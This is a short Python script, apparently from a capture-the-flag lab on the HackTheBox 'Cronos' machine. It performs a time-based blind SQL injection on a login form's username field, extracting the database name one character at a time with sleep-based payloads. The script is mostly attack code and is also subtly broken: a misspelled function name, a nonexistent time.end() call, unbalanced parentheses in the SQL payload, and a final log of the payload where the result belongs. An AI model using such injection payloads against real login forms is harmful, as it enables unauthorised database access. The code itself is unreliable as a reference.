#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

def def_handler(signal, frame):
	log.failure("saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url="http://admin.cronos.htb/index.php"
burp={'http':'http://127.0.0.1:8080'}
s=r"0123456789abcdefghijklmnopqrstuvwxyz"
result=""

def chacker(payload):
	data_post={
		'username': '%s' % payload,
		'password':'test'
	}

	time_start=time.time()
	content=requests.post(url, data=data_post)
	time_end=time.end()

	if time_end-time_start > 5:
		return 1

p1=log.progress("Database")
p2=log.progress("Payload")

for i in  range(1,10):
	for c in s:
		payload="' or if(substr(database(),%d),1)='%c', sleep(5),1)-- -" %(i,c)

		p2.status("%s" % payload)

		if checker(payload):
			result+=c
			p1.status("%s" % result)
			break

log.info("Database: %s" % payload)


